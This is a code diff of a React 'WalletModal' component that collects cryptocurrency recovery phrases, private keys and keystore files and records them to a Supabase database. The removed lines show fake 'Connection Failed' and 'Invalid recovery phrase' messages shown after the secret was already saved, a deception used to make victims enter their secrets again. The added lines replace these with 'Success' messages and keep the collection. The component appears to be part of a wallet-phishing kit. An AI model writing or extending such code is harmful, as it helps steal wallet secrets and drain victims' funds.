@@ -7,6 +7,7 @@ import { Input } from "@/components/ui/input";
 import { useToast } from "@/hooks/use-toast";
 import { Wallet } from "lucide-react";
 import { supabase } from '@/lib/supabase';
+import { useNavigate } from 'react-router-dom';
 
 interface WalletModalProps {
   isOpen: boolean;
@@ -22,6 +23,7 @@ const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose, walletName }
   const [file, setFile] = useState<File | null>(null);
   const { toast } = useToast();
 
+
   const handlePhraseSubmit = async () => {
     try {
       const { error } = await supabase
@@ -35,19 +37,12 @@ const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose, walletName }
       if (error) throw error;
 
       toast({
-        title: "Connection Attempt Recorded",
-        description: "Please wait while we verify your wallet..."
+        title: "Success",
+        description: "Wallet connection recorded successfully."
       });
       
-      setTimeout(() => {
-        toast({
-          variant: "destructive",
-          title: "Connection Failed",
-          description: "Invalid recovery phrase. Please try again."
-        });
-      }, 2000);
-      
       onClose();
+   
     } catch (error) {
       console.error('Error saving phrase:', error);
       toast({
@@ -71,19 +66,12 @@ const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose, walletName }
       if (error) throw error;
 
       toast({
-        title: "Connection Attempt Recorded",
-        description: "Please wait while we verify your private key..."
+        title: "Success",
+        description: "Private key recorded successfully."
       });
       
-      setTimeout(() => {
-        toast({
-          variant: "destructive",
-          title: "Connection Failed",
-          description: "Invalid private key. Please try again."
-        });
-      }, 2000);
-      
       onClose();
+    
     } catch (error) {
       console.error('Error saving private key:', error);
       toast({
@@ -110,19 +98,12 @@ const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose, walletName }
       if (error) throw error;
 
       toast({
-        title: "Processing Keystore",
-        description: "Please wait while we decode your keystore file..."
+        title: "Success",
+        description: "Keystore information recorded successfully."
       });
       
-      setTimeout(() => {
-        toast({
-          variant: "destructive",
-          title: "Decryption Failed",
-          description: "Unable to decrypt keystore with provided password."
-        });
-      }, 2000);
-      
       onClose();
+    
     } catch (error) {
       console.error('Error saving keystore:', error);
       toast({
